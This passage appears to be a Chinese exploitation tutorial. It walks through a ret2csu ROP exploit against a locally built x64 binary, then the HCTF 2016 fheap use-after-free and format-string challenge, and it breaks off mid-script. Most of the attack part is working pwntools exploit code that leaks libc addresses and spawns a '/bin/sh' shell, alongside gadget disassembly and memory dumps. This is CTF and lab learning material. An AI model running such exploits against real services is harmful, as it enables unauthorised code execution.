<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -fno-stack-protector linux_x64_test3.c -o linux_x64_test3 -ldl //禁用栈保护</span><br></pre></td></tr></table></figure>
<p>检查防护</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb-peda$ checksec linux_x64_test3</span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br><span class="line">gdb-peda$ quit</span><br></pre></td></tr></table></figure>

<h4 id="bss段"><a href="#bss段" class="headerlink" title=".bss段"></a>.bss段</h4><p>相关概念：堆(heap)，栈(stack)，BSS段，数据段(data)，代码段(code &#x2F;text)，全局静态区，文字常量区，程序代码区。<br>BSS段：BSS段（bss segment）通常是指用来存放程序中未初始化的全局变量的一块内存区域。<br>数据段：数据段（data segment）通常是指用来存放程序中已初始化的全局变量的一块内存区域。<br>代码段：代码段（code segment&#x2F;text segment）通常是指用来存放程序执行代码的一块内存区域。这部分区域的大小在程序运行前就已经确定，并且内存区域通常属于只读, 某些架构也允许代码段为可写，即允许修改程序。在代码段中，也有可能包含一些只读的常数变量，例如字符串常量等。<br>堆（heap）：堆是用于存放进程运行中被动态分配的内存段，它的大小并不固定，可动态扩张或缩减。当进程调用malloc等函数分配内存时，新分配的内存就被动态添加到堆上（堆被扩张）；当利用free等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减）。<br>栈(stack)：栈又称堆栈，用户存放程序临时创建的局部变量。在函数被调用时，其参数也会被压入发起调用的进程栈中，并且待到调用结束后，函数的返回值也会被存放回栈中。由于栈的后进先出特点，所以栈特别方便用来保存&#x2F;恢复调用现场。<br>程序的.bss段中。.bss段是用来保存全局变量的值的，地址固定，并且可以读可写。</p>
<table>
<thead>
<tr>
<th>Name</th>
<th>Type</th>
<th>Addr</th>
<th>Off</th>
<th>Size</th>
<th>ES</th>
<th>Flg</th>
<th>Lk</th>
<th>Inf</th>
<th>Al</th>
</tr>
</thead>
<tbody><tr>
<td>名字</td>
<td>类型</td>
<td>起始地址</td>
<td>文件的偏移地址</td>
<td>区大小</td>
<td>表区的大小</td>
<td>区标志</td>
<td>相关区索引</td>
<td>其他区信息</td>
<td>对齐字节数</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">panda@ubuntu:~/Desktop/test$ readelf -S linux_x64_test3</span><br><span class="line">There are 31 section headers, starting at offset 0x1a48:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line">  [24] .got.plt          PROGBITS         0000000000601000  00001000</span><br><span class="line">       0000000000000030  0000000000000008  WA       0     0     8</span><br><span class="line">  [25] .data             PROGBITS         0000000000601030  00001030</span><br><span class="line">       0000000000000010  0000000000000000  WA       0     0     8</span><br><span class="line">  [26] .bss              NOBITS           0000000000601040  00001040</span><br><span class="line">       0000000000000008  0000000000000000  WA       0     0     1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), l (large)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br></pre></td></tr></table></figure>

<h4 id="寻找合适的gadget"><a href="#寻找合适的gadget" class="headerlink" title="寻找合适的gadget"></a>寻找合适的gadget</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">panda@ubuntu:~/Desktop/test$ objdump -d linux_x64_test3</span><br><span class="line">00000000004005c0 &lt;__libc_csu_init&gt;:</span><br><span class="line">  4005c0:	41 57                	push   %r15</span><br><span class="line">  4005c2:	41 56                	push   %r14</span><br><span class="line">  4005c4:	41 89 ff             	mov    %edi,%r15d</span><br><span class="line">  4005c7:	41 55                	push   %r13</span><br><span class="line">  4005c9:	41 54                	push   %r12</span><br><span class="line">  4005cb:	4c 8d 25 3e 08 20 00 	lea    0x20083e(%rip),%r12        <span class="comment"># 600e10 &lt;__frame_dummy_init_array_entry&gt;</span></span><br><span class="line">  4005d2:	55                   	push   %rbp</span><br><span class="line">  4005d3:	48 8d 2d 3e 08 20 00 	lea    0x20083e(%rip),%rbp        <span class="comment"># 600e18 &lt;__init_array_end&gt;</span></span><br><span class="line">  4005da:	53                   	push   %rbx</span><br><span class="line">  4005db:	49 89 f6             	mov    %rsi,%r14</span><br><span class="line">  4005de:	49 89 d5             	mov    %rdx,%r13</span><br><span class="line">  4005e1:	4c 29 e5             	sub    %r12,%rbp</span><br><span class="line">  4005e4:	48 83 ec 08          	sub    <span class="variable">$0x8</span>,%rsp</span><br><span class="line">  4005e8:	48 c1 fd 03          	sar    <span class="variable">$0x3</span>,%rbp</span><br><span class="line">  4005ec:	e8 0f fe ff ff       	callq  400400 &lt;_init&gt;</span><br><span class="line">  4005f1:	48 85 ed             	<span class="built_in">test</span>   %rbp,%rbp</span><br><span class="line">  4005f4:	74 20                	je     400616 &lt;__libc_csu_init+0x56&gt;</span><br><span class="line">  4005f6:	31 db                	xor    %ebx,%ebx</span><br><span class="line">  4005f8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)</span><br><span class="line">  4005ff:	00 </span><br><span class="line">  </span><br><span class="line">  400600:	4c 89 ea             	mov    %r13,%rdx</span><br><span class="line">  400603:	4c 89 f6             	mov    %r14,%rsi</span><br><span class="line">  400606:	44 89 ff             	mov    %r15d,%edi</span><br><span class="line">  400609:	41 ff 14 dc          	callq  *(%r12,%rbx,8)</span><br><span class="line">  40060d:	48 83 c3 01          	add    <span class="variable">$0x1</span>,%rbx</span><br><span class="line">  400611:	48 39 eb             	cmp    %rbp,%rbx</span><br><span class="line">  400614:	75 ea                	jne    400600 &lt;__libc_csu_init+0x40&gt;</span><br><span class="line">  400616:	48 83 c4 08          	add    <span class="variable">$0x8</span>,%rsp</span><br><span class="line">  </span><br><span class="line">  40061a:	5b                   	pop    %rbx</span><br><span class="line">  40061b:	5d                   	pop    %rbp</span><br><span class="line">  40061c:	41 5c                	pop    %r12</span><br><span class="line">  40061e:	41 5d                	pop    %r13</span><br><span class="line">  400620:	41 5e                	pop    %r14</span><br><span class="line">  400622:	41 5f                	pop    %r15</span><br><span class="line">  400624:	c3                   	retq   </span><br><span class="line">  400625:	90                   	nop</span><br><span class="line">  400626:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)</span><br><span class="line">  40062d:	00 00 00 </span><br></pre></td></tr></table></figure>
<p>程序自己的 __libc_csu_init 函数，没开PIE.</p>
<p>疑问:</p>
<ol>
<li><p>这里可以直接write出got_system吗？ 既然都得到got_write这个是静态地址，还能去调用，难道got表函数随便调用不变？<br>got_system 存储了实际的 libc-2.23.so!write 地址，所以去执行 got_system 然后打印出实际地址<br><img src="https://i.loli.net/2020/05/20/tudFLS2mWTrqZDP.jpg" alt="-w973"></p>
</li>
<li><p>为什么不传递 “&#x2F;bin&#x2F;sh”的字符串地址到最后调用的system(“&#x2F;bin&#x2F;sh”),而是将”&#x2F;bin&#x2F;sh”写入 bss段<br>因为这里rdi&#x3D;r15d&#x3D;param1  r15d 32-bit 所以不能传递给rdi 64-bit的 “&#x2F;bin&#x2F;sh” 字符串地址，所以必须写入到可写bss段，因为程序段就32-bit</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00007f76:f3c0bd57|2f 62 69 6e 2f 73 68 00 65                     |/bin/sh.e       |</span><br></pre></td></tr></table></figure></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// /dev/stdin    fd/0</span><br><span class="line">// /dev/stdout   fd/1</span><br><span class="line">// /dev/stderr   fd/2</span><br></pre></td></tr></table></figure>
<p>总结: </p>
<ol>
<li>返回到 0x40061a 控制 <code>rbx,rbp,r12,r13,r14,r15</code></li>
<li>返回到 0x400600 执行 <code>rdx=r13 rsi=r14 rdi=r15d call callq  *(%r12,%rbx,8)</code></li>
<li>使 rbx&#x3D;0 这样最后就可以<code>callq *(r12+rbx*8)</code> &#x3D; <code>callq *(r12)</code>  可以构造rop使之能执行任意函数</li>
<li>需要泄露真实 libc.so 在内存中的地址才能拿到system_addr,才能getshell,那么返回调用<code>got_write(rdi=1,rsi=got_write,rdx=8)</code>，从服务端返回write_addr，通过write_addr减去 - write_static&#x2F;libc.symbols[‘write’]和system_static&#x2F;libc.symbols[‘system’] 的差值得到 system_addr，然后返回到main重新开始，但并没有结束进程</li>
<li>返回调用got_read(rdi&#x3D;0,bss_addr,16),相当于执行 <code>got_read(rdi=0,bss_addr,8)</code> ,<code>got_read(rdi=0,bss_addr+8,8)</code>,发送 system_addr,”&#x2F;bin&#x2F;sh”,然后返回到main重新开始，但并没有结束进程</li>
<li>返回到bss_addr(bss_addr+8)  -&gt;  system_addr(binsh_addr)</li>
</ol>
<h4 id="开始构造ROP"><a href="#开始构造ROP" class="headerlink" title="开始构造ROP"></a>开始构造ROP</h4><p>查看got表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">panda@ubuntu:~/Desktop/test$ objdump -R linux_x64_test3</span><br><span class="line"></span><br><span class="line">linux_x64_test3:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET           TYPE              VALUE </span><br><span class="line">0000000000600ff8 R_X86_64_GLOB_DAT  __gmon_start__</span><br><span class="line">0000000000601018 R_X86_64_JUMP_SLOT  write@GLIBC_2.2.5</span><br><span class="line">0000000000601020 R_X86_64_JUMP_SLOT  read@GLIBC_2.2.5</span><br><span class="line">0000000000601028 R_X86_64_JUMP_SLOT  __libc_start_main@GLIBC_2.2.5</span><br></pre></td></tr></table></figure>
<p>然后利用代码如下:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc_elf = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">linux_x64_test3_elf = ELF(<span class="string">&quot;./linux_x64_test3&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./linux_x64_test3&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15_ret = <span class="number">0x40061a</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] pop_rbx_rbp_r12_r13_r14_r15_ret = 0x%x&quot;</span> % pop_rbx_rbp_r12_r13_r14_r15_ret)</span><br><span class="line">rdx_rsi_rdi_callr12_ret = <span class="number">0x400600</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] rdx_rsi_rdi_callr12_ret = 0x%x&quot;</span> %  rdx_rsi_rdi_callr12_ret)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0000000000601018 R_X86_64_JUMP_SLOT  write@GLIBC_2.2.5</span></span><br><span class="line"><span class="string">0000000000601020 R_X86_64_JUMP_SLOT  read@GLIBC_2.2.5</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">got_write =<span class="number">0x0000000000601018</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] got_write = 0x%x&quot;</span> % got_write)</span><br><span class="line"></span><br><span class="line">got_write2=linux_x64_test3_elf.got[<span class="string">&quot;write&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] got_write2 = 0x%x&quot;</span> %  got_write2)</span><br><span class="line"></span><br><span class="line">got_read = <span class="number">0x0000000000601020</span></span><br><span class="line">got_read2=linux_x64_test3_elf.got[<span class="string">&quot;read&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0000000000400587 &lt;main&gt;:</span></span><br><span class="line"><span class="string">  400587:	55                   	push   %rbp</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">main_static = <span class="number">0x0000000000400587</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># call got_write(rdi=1,rsi=got_write, rdx=8)</span></span><br><span class="line"><span class="comment"># rdi=r15d=param1  rsi=r14=param2 rdx=r13=param3  r12=call_address</span></span><br><span class="line">payload1 =<span class="string">&quot;A&quot;</span>*<span class="number">136</span> + p64(pop_rbx_rbp_r12_r13_r14_r15_ret) <span class="comment"># ret address  : p64(pop_rbx_rbp_r12_r13_r14_r15_ret)</span></span><br><span class="line">payload1 += p64(<span class="number">0</span>)+ p64(<span class="number">1</span>)                               <span class="comment"># rbx=0 rbp=1  : p64(0)+ p64(1)</span></span><br><span class="line">payload1 += p64(got_write)                               <span class="comment"># call_address : got_write</span></span><br><span class="line">payload1 += p64(<span class="number">8</span>)                                       <span class="comment"># param3       : 8</span></span><br><span class="line">payload1 += p64(got_write)                               <span class="comment"># param2       : got_write</span></span><br><span class="line">payload1 += p64(<span class="number">1</span>)                                       <span class="comment"># param1       : 1</span></span><br><span class="line"></span><br><span class="line">payload1 += p64(rdx_rsi_rdi_callr12_ret)                 <span class="comment"># call r12</span></span><br><span class="line">payload1 += p64(<span class="number">0</span>)*<span class="number">7</span>                                     <span class="comment"># add    $0x8,%rsp # 6 pop</span></span><br><span class="line">payload1 += p64(main_static)                             <span class="comment"># return main</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] send payload1 call got_write(rdi=1,rsi=got_write, rdx=8)&quot;</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] write_addr = 0x%x&quot;</span> % write_addr)</span><br><span class="line"></span><br><span class="line">write_static = libc_elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_static = libc_elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">system_addr = write_addr - (write_static - system_static)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] system_addr = 0x%x&quot;</span> % system_addr)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">  [26] .bss              NOBITS           0000000000601040  00001040</span></span><br><span class="line"><span class="string">       0000000000000008  0000000000000000  WA       0     0     1</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">bss_addr = <span class="number">0x0000000000601040</span></span><br><span class="line">bss_addr2 = linux_x64_test3_elf.bss()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] bss_addr  = 0x%x&quot;</span> % bss_addr)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] bss_addr2 = 0x%x&quot;</span> % bss_addr2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># call got_read(rdi=0,rsi=bss_addr, rdx=16)</span></span><br><span class="line"><span class="comment"># got_read(rdi=0,rsi=bss_addr, rdx=8)             write system</span></span><br><span class="line"><span class="comment"># got_read(rdi=0,rsi=bss_addr+8, rdx=8)           write /bin/sh</span></span><br><span class="line"><span class="comment"># rdi=r15d=param1  rsi=r14=param2 rdx=r13=param3  r12=call_address</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&quot;A&quot;</span>*<span class="number">136</span> + p64(pop_rbx_rbp_r12_r13_r14_r15_ret)    <span class="comment"># ret address  : p64(pop_rbx_rbp_r12_r13_r14_r15_ret)</span></span><br><span class="line">payload2 += p64(<span class="number">0</span>)+ p64(<span class="number">1</span>)                                   <span class="comment"># rbx=0 rbp=1  : p64(0)+ p64(1)</span></span><br><span class="line">payload2 += p64(got_read)                                    <span class="comment"># call_address : got_read</span></span><br><span class="line">payload2 += p64(<span class="number">16</span>)                                          <span class="comment"># param3       : 16</span></span><br><span class="line">payload2 += p64(bss_addr)                                    <span class="comment"># param2       : bss_addr</span></span><br><span class="line">payload2 += p64(<span class="number">0</span>)                                           <span class="comment"># param1       : 0</span></span><br><span class="line"></span><br><span class="line">payload2 += p64(rdx_rsi_rdi_callr12_ret)                     <span class="comment"># call r12</span></span><br><span class="line">payload2 += p64(<span class="number">0</span>)*<span class="number">7</span>                                         <span class="comment"># add    $0x8,%rsp   6 pop</span></span><br><span class="line">payload2 += p64(main_static)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] send payload2 call got_read(rdi=0,rsi=bss_addr, rdx=16)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line">p.send(payload2)</span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line"></span><br><span class="line">p.send(p64(system_addr) + <span class="string">&quot;/bin/sh\0&quot;</span>)  <span class="comment">#send /bin/sh\0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">00000000:00601040|00007f111b941390|........|</span></span><br><span class="line"><span class="string">00000000:00601048|0068732f6e69622f|/bin/sh.|</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># call bss_addr(rdi=bss_addr+8) system_addr(rdi=binsh_addr)</span></span><br><span class="line"><span class="comment"># rdi=r15d=param1  rsi=r14=param2 rdx=r13=param3  r12=call_address</span></span><br><span class="line"></span><br><span class="line">payload3 =<span class="string">&quot;A&quot;</span>*<span class="number">136</span> + p64(pop_rbx_rbp_r12_r13_r14_r15_ret)     <span class="comment"># ret address  : p64(pop_rbx_rbp_r12_r13_r14_r15_ret)</span></span><br><span class="line">payload3 += p64(<span class="number">0</span>)+ p64(<span class="number">1</span>)                                   <span class="comment"># rbx=0 rbp=1  : p64(0)+ p64(1)</span></span><br><span class="line">payload3 += p64(bss_addr)                                    <span class="comment"># call_address : bss_addr</span></span><br><span class="line">payload3 += p64(<span class="number">0</span>)                                           <span class="comment"># param3       : 0</span></span><br><span class="line">payload3 += p64(<span class="number">0</span>)                                           <span class="comment"># param2       : 0</span></span><br><span class="line">payload3 += p64(bss_addr+<span class="number">8</span>)                                  <span class="comment"># param1       : bss_addr+8</span></span><br><span class="line"></span><br><span class="line">payload3 += p64(rdx_rsi_rdi_callr12_ret)        <span class="comment"># call r12</span></span><br><span class="line">payload3 += p64(<span class="number">0</span>)*<span class="number">7</span>                            <span class="comment"># add $0x8,%rsp   6 pop</span></span><br><span class="line">payload3 += p64(main_static)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] send payload3 call system_addr(rdi=binsh_addr)&quot;</span>)</span><br><span class="line">p.send(payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="实践4-释放后使用（Use-After-Free）学习"><a href="#实践4-释放后使用（Use-After-Free）学习" class="headerlink" title="实践4_释放后使用（Use-After-Free）学习"></a>实践4_释放后使用（Use-After-Free）学习</h3><p>用 <a href="https://github.com/zh-explorer/hctf2016-fheap">2016HCTF_fheap</a>作为学习目标，该题存在格式化字符漏洞和UAF漏洞。<br>格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数。格式化字符漏洞是控制第一个参数可能导致任意地址读写。<br>释放后使用（Use-After-Free）漏洞是内存块被释放后，其对应的指针没有被设置为 NULL,再次申请内存块特殊改写内存导致任意地址读或劫持控制流。</p>
<h4 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h4><p>checksec查询发现全开了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>程序很简单就3个操作，create,delete,quit<br><img src="https://i.loli.net/2020/05/20/ocXIbSTWuF7iJPA.jpg" alt="-w497"></p>
<h5 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h5><p>在delete操作上发现调用free指针函数释放结构后没有置结构指针为NULL,这样就能实现UAF，  如下图<br><img src="https://i.loli.net/2020/05/20/bH2NKA3CpfrBDPV.jpg" alt="-w710"></p>
<p>create功能会先申请0x20字节的内存堆块存储结构，如果输入的字符串长度大于0xf，则另外申请指定长度的空间存储数据，否则存储在之前申请的0x20字节的前16字节处，在最后，会将相关free函数的地址存储在堆存储结构的后八字节处<br><img src="https://i.loli.net/2020/05/20/xtGHUhoyOK7erjq.jpg" alt="-w467"><br>在create时全局结构指向我们申请的内存<br><img src="https://i.loli.net/2020/05/20/KAVDOuT18wUpnWm.jpg" alt="-w401"><br>这样就可以恶意构造结构数据,利用uaf覆盖旧数据结果的函数指针，打印出函数地址，泄露出二进制base基址，主要逻辑如下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">create(4 创建old_chunk0 但是程序占位 old_chunk0_size=0x30 申请0x20</span><br><span class="line">create(4 创建old_chunk1 但是程序占位 old_chunk1_size=0x30 申请0x20</span><br><span class="line">释放chunk1</span><br><span class="line">释放chunk0</span><br><span class="line">create(0x20 创建 chunk0 占位 old_chunk0,占位 old_chunk1</span><br><span class="line">            创建 chunk1 覆盖 old_chunk1-&gt;data-&gt;free 为 puts</span><br></pre></td></tr></table></figure>
<p>此时执行delete操作，也就执行了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">free(ptr) -&gt; puts(ptr-&gt;buffer和后面覆盖的puts地址)</span><br></pre></td></tr></table></figure>
<p>打印出了puts_addr地址，然后通过计算偏移得到二进制基址,如下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bin_base_addr = puts_addr - offset</span><br></pre></td></tr></table></figure>
<p>然后利用二进制基址算出二进制自带的 printf 真实地址，再次利用格式化字符漏洞实现任意地址读写。<br>如下是得到printf 真实地址 printf_addr后利用格式化字符漏洞实现任意地址读写的测试过程，我们输出10个%p 也就打印了堆栈前几个数据值。然后找到了 arg9 为我们能够控制的数据，所以利用脚本里printf输出参数变成了 “%9$p”，读取第九个参数。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = <span class="string">&#x27;a%p%p%p%p%p%p%p%p%p%p&#x27;</span>.ljust(<span class="number">0x18</span>, <span class="string">&#x27;#&#x27;</span>) + p64(printf_addr)  <span class="comment"># 覆盖chunk1的 free函数-&gt; printf</span></span><br><span class="line">create(<span class="number">0x20</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;quit&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;delete &quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;id:&quot;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(<span class="number">1</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;?:&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;yes.1111&quot;</span> + p64(addr) + <span class="string">&quot;\n&quot;</span>)  <span class="comment"># 触发 printf漏洞</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">data = p.recvuntil(<span class="string">&#x27;####&#x27;</span>)[:-<span class="number">4</span>]</span><br></pre></td></tr></table></figure>
<p>IDA调试时内存数据为如下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0000560DFCD3C000  00 00 00 00 00 00 00 00  31 00 00 00 00 00 00 00  ........1.......</span><br><span class="line">0000560DFCD3C010  40 C0 D3 FC 0D 56 00 00  00 00 00 00 00 00 00 00  @....V..........</span><br><span class="line">0000560DFCD3C020  1E 00 00 00 00 00 00 00  6C CD 7C FB 0D 56 00 00  ........l....V..</span><br><span class="line">0000560DFCD3C030  00 00 00 00 00 00 00 00  31 00 00 00 00 00 00 00  ........1.......</span><br><span class="line">0000560DFCD3C040  61 25 70 25 70 25 70 25  70 25 70 25 70 25 70 25  a%p%p%p%p%p%p%p%</span><br><span class="line">0000560DFCD3C050  70 25 70 25 70 23 23 23  D0 C9 7C FB 0D 56 00 00  p%p%p<span class="comment">###..|..V..</span></span><br><span class="line"></span><br><span class="line">00007FFE50BF9630  00 00 00 00 00 00 00 00  00 00 00 00 01 00 00 00  ................</span><br><span class="line">00007FFE50BF9640  79 65 73 2E 31 31 31 31  00 60 8C 2B 45 56 00 00  yes.1111.`.+EV..</span><br><span class="line"></span><br><span class="line">00007FFCA59554F8  0000560DFB7CCE95  delete_sub_D95+100</span><br><span class="line">00007FFCA5955500  0000000000000000</span><br><span class="line">00007FFCA5955508  0000000100000000  arg7</span><br><span class="line">00007FFCA5955510  313131312E736579  arg8</span><br><span class="line">00007FFCA5955518  0000560DFB7CC000  LOAD:0000560DFB7CC000 <span class="comment"># arg9 读取这个 arg9  所以这里选择 %9$s</span></span><br><span class="line">00007FFCA5955520  000000000000000A</span><br><span class="line">00007FFCA5955528  0000560DFB7CCA50  start</span><br><span class="line">00007FFCA5955530  00007FFCA5955D90  [stack]:00007FFCA5955D90</span><br></pre></td></tr></table></figure>
<p>利用格式化字符串漏洞实现任意地址后，读取两个libc函数然后确定libc版本,获取对应libc版本的system_addr</p>
<h4 id="最终利用"><a href="#最终利用" class="headerlink" title="最终利用"></a>最终利用</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># target = process(&#x27;pwn-f&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;172.16.36.176&#x27;</span>, <span class="number">10003</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn-f&quot;</span>)</span><br><span class="line">libc_elf = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size, string</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;3.quit&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;create &#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;size:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;str:&#x27;</span>)</span><br><span class="line">    p.send(string)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;3.quit&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;delete &#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;sure?:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr</span>):</span><br><span class="line">    <span class="keyword">global</span> printf_addr</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    payload = <span class="string">&#x27;a%9$s&#x27;</span>.ljust(<span class="number">0x18</span>,<span class="string">&#x27;#&#x27;</span>) + p64(printf_addr) <span class="comment">#覆盖chunk1的 free函数-&gt; printf</span></span><br><span class="line">    create(<span class="number">0x20</span>,payload)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;quit&quot;</span>)</span><br><span class="line">    p.send(<span class="string">&quot;delete &quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;id:&quot;</span>)</span><br><span class="line">    p.send(<span class="built_in">str</span>(<span class="number">1</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;?:&quot;</span>)</span><br><span class="line">    p.send(<span class="string">&quot;yes.1111&quot;</span>+p64(addr)+<span class="string">&quot;\n&quot;</span>) <span class="comment"># 触发 printf漏洞</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    data = p.recvuntil(<span class="string">&#x27;####&#x27;</span>)[:-<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(data) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(data) &lt;= <span class="number">8</span>:</span><br><span class="line">        log.info(<span 